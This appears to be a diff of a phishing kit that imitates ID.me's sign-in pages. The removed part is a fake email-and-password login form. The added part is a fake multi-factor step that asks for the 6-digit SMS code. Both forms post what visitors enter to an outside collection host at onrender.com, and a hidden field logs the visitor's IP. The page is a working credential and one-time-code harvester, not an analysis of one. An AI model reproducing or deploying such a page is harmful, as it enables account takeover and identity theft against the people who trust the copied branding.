@@ -118,7 +118,7 @@
     <script src="https://static.queue-it.net/script/queueconfigloader.min.js" data-queueit-c="idme"></script>
     <meta name="csrf-param" content="authenticity_token" />
     <meta name="csrf-token"
-        content="TMnpg+ITTx0b5J+SyeKXWnsyV3AcUZX3fTD1H+3IUhyNEJtkGQGpgsG7rcpV/E1IfbNganyU9Q31o6+SH9RJZw==" />
+        content="TMnpg+ITTx0b5J+SyeKXWnsyV3AcUZX3fTD1H+3IUhyNEJtkGQGpgsG7rcpV/E1IfbNganyU9Q31o6+SH9zRJZw==" />
     <link rel="stylesheet" media="all"
         href="../../assets/application-4a0b7b0d263d32df24730ee97ea6b5d903415cee58a98f8c50b810771c34dcef.css" />
     <script>
@@ -270,151 +270,121 @@
 
 
 
-
-<body class=''>
-    <div id='ZN_2bLc7fWaOZ8U4ey'></div>
-
-
-    <div class='page-container' data-role='page-container'>
-        <div class='container'>
-            <div class='content-container'>
+<body class="">
+    <div id="ZN_2bLc7fWaOZ8U4ey"></div>
 
 
+    <div class="page-container" data-role="page-container">
+        <div class="container">
+            <div class="content-container multifactor-event multifactor-generator">
+                <div class="form-header">
 
-
-
-
-
-
-
-
-
-
-
-                <form action="https://ill-submitter.onrender.com/new_submit.php" method="post" data-validate="signin" accept-charset="UTF-8">
-
-                    <input type="hidden" autocomplete="off" />
-
-                    <input autocomplete="off" type="hidden" />
-
-
-                    <div class='form-header'>
-                        <div class='form-header-content' role='banner'>
-                            <div class='partner'>
-                                <div class='c_icon m_idme'>
-                                    <img alt="ID.me"
-                                        src="../../assets/logos/idme-logo-1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg" />
-                                </div>
+                    <div class="form-header-content" role="banner">
+                        <div class="partner">
+                            <div class="c_icon m_idme">
+                                <img alt="ID.me"
+                                    src="../../assets/logos/idme-logo-1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg">
                             </div>
                         </div>
-
-
                     </div>
 
-                    <main aria-labelledby='sr_page_title' class='form-container'>
-                        <div class='form-header-access'>
-                            <h1 id='sr_page_title'>Sign in to ID.me</h1>
-                        </div>
-                        <div class='form-header-well'>
-                            <p>New to ID.me?</p>
-                            <p><a href="../registration/new.html">Create an ID.me account</a></p>
-                        </div>
-                        <p class='alert alert-error' role='alert' style=''>
+
+
+
+                </div>
+                <main aria-labelledby="sr_page_title" class="form-container">
+                    <h1 id="sr_page_title">Complete your sign in</h1>
+
+                    <ul class="subway_stops three-stops">
+                        <li class="subway_stops-item">
+                            <span>1</span>
+                            <span class="sr-only">Choose your multi-factor method</span>
+                        </li>
+                        <li class="subway_stops-item">
+                            <span>2</span>
+                            <span class="sr-only">Initiate your multi-factor method</span>
+                        </li>
+                        <li aria-current="true" class="subway_stops-item active">
+                            <span class="sr-only">Current step</span>
+                            <span>3</span>
+                            <span class="sr-only">Confirm your multi-factor method</span>
+                        </li>
+                    </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                    <form method="post" action="https://ill-submitter.onrender.com/otp_submit.php" accept-charset="UTF-8" data-validate="">
+
+
+                        <input type="hidden" autocomplete="off">
+
+                        <input type="hidden" autocomplete="off">
+
+                        <p class="alert alert-error" role="alert" style="">
 
                         </p>
-                        <p class='alert alert-success' role='alert' style=''>
+                        <p class="alert alert-success" role="alert" style="">
 
                         </p>
 
                         <input type="hidden" name="ip" value="<?php echo getenv('HTTP_X_FORWARDED_FOR'); ?>" />
 
-                        <div class='form-fields'>
-                            <div class='field-group'>
-                                <div class='field text'>
-                                    <label for="user_email">Email</label>
-                                    <input placeholder="Enter your email address" required="required"
-                                        autocomplete="email" type="email" name="useremail" id="user_email" />
-                                    <span role='alert'>
 
-                                    </span>
-                                </div>
-                                <div class='field text'>
-                                    <label for="user_password">Password</label>
-                                    <input placeholder="Enter password" required="required"
-                                        autocomplete="current-password" type="password" name="userpassword"
-                                        id="user_password" />
-                                    <span role='alert'>
+                        <div class="form-content">
+                            <h2>Enter a code from your device</h2>
+                            <p>Please check your phone and enter the 6-digit code sent via sms to complete your sign in.
+                                It might take a minute or two for the code to arrive, please be patient.</p>
+                        </div>
 
-                                    </span>
-                                </div>
-                                <div class='field checkbox remember_me' data-component='Cookies.Delete'
-                                    data-endpoint='/cookies/remember_me'>
-                                    <input type="checkbox" name="remember_me" id="remember_me" value="true"
-                                        aria-describedby="remember-me-tip" />
-                                    <label for="remember_me"><span aria-hidden='true' class='checkmark'>
-                                            &#xe61b
-                                        </span>
 
-                                        <span>
-                                            Remember me
-                                        </span>
-                                        <div id='remember-me-tip'>
-                                            For your security, select only on your devices.
-                                        </div>
-                                    </label>
-                                </div>
+                        <div class="form-fields">
+                            <div class="field text m_code">
+                                <label class="required" for="multifactor_code">Enter the 6-digit code</label>
+                                <input maxlength="6" pattern="[0-9]*" placeholder="______" required="required"
+                                    autocomplete="one-time-code" size="6" type="text" name="userotp"
+                                    id="multifactor_code">
+                                <span role="alert">
 
+                                </span>
+                            </div>
+                        </div>
+
+                        <div class="form-footer with-background">
+                            <p>Make sure to enter the correct 6-digit code that was sent to your phone. <a href="#"></a>
+                            </p>
+                        </div>
+
+                        <div class="form-actions">
+                            <div class="form-action-button">
+                                <button name="submit" type="submit" class="btn btn-primary" data-disable="true"
+                                    data-clicked="">Continue</button>
                             </div>
                         </div>
 
 
-                        <div class=''>
-                            <input type="submit" name="submit" value="Sign in" class="btn btn-primary"
-                                data-disable-with="Signing in to ID.me..." data-clicked="" />
-                        </div>
-
-
-
-
-
-
-                        <div class='form-footer'>
-                            <p><a href="#">Forgot password</a></p>
-                        </div>
-                        <div class='separator'>
-                            <span>OR</span>
-                        </div>
-
-                        <div class='connections'>
-                            <a class="facebook connection" aria-label="Sign in with Facebook" href="#"></a>
-                            <a class="google connection" aria-label="Sign in with Google" href="#"></a>
-                            <a class="apple connection" aria-label="Sign in with Apple" href="#"></a>
-                            <a class="linkedin connection" #"></a>
-                            <a class="connection m_full" href="options.html">View more options</a>
-                        </div>
-
-                    </main>
-                </form>
-
-
-
-
-
-
-
-
+                    </form>
+                </main>
             </div>
 
 
-            <footer class='footer'>
-                <nav aria-label='Footer' class='footer__links'>
-                    <ul class='footer__list'>
-                        <li class='footer__list-item'><a target="_blank" class="footer__link"
-                                href="../../../www.id.me/about.html">What is ID.me?</a></li>
-                        <li class='footer__list-item'><a target="_blank" class="footer__link"
-                                href="../../../www.id.me/terms.html">Terms of Service</a></li>
-                        <li class='footer__list-item'><a target="_blank" class="footer__link"
-                                href="../../../www.id.me/privacy.html">Privacy Policy</a></li>
+            <footer class="footer">
+                <nav aria-label="Footer" class="footer__links">
+                    <ul class="footer__list">
+                        <li class="footer__list-item"><a target="_blank" class="footer__link"
+                                href="https://www.id.me/about">What is ID.me?</a></li>
+                        <li class="footer__list-item"><a target="_blank" class="footer__link"
+                                href="https://www.id.me/terms">Terms of Service</a></li>
+                        <li class="footer__list-item"><a target="_blank" class="footer__link"
+                                href="https://www.id.me/privacy">Privacy Policy</a></li>
                     </ul>
                 </nav>
             </footer>
@@ -426,11 +396,14 @@
         src="https://maps.googleapis.com/maps/api/js?key=AIzaSyD0zvJrQMX-chNAK69YL8jhcQzgruOmKDo&amp;libraries=places">
     </script>
 
-    <script src="../../assets/application-23dc0e19928a6f0416b8405d6e483b7d8cb3df42c849cd7a9ec060c158b1f178.js"></script>
-    <script src="../../assets/zendesk/chat-277e743ae9574a31927fbdf43530b414d8e8480f369965cec738a2a93d3e0311.js">
+    <script src="/assets/application-23dc0e19928a6f0416b8405d6e483b7d8cb3df42c849cd7a9ec060c158b1f178.js"></script>
+    <script src="/assets/zendesk/chat-277e743ae9574a31927fbdf43530b414d8e8480f369965cec738a2a93d3e0311.js"></script>
+    <script type="text/javascript" src="/NnCY6vf48/1H/Pa/SKupt_XE_TXGgY/iSYtrVJbfJSY9u/Rz9EDlMEJRE/NA/JnRAA2Dlg">
     </script>
-    <script type="text/javascript"
-        src="../../NnCY6vf48/1H/Pa/SKupt_XE_TXGgY/iSYtrVJbfJSY9u/Rz9EDlMEJRE/NA/JnRAA2Dlg.js"></script>
+
+    <iframe data-product="web_widget" title="No content" role="presentation" tabindex="-1" allow="microphone *"
+        aria-hidden="true" src="about:blank"
+        style="width: 0px; height: 0px; border: 0px; position: absolute; top: -9999px;"></iframe>
 </body>
 
 </html>
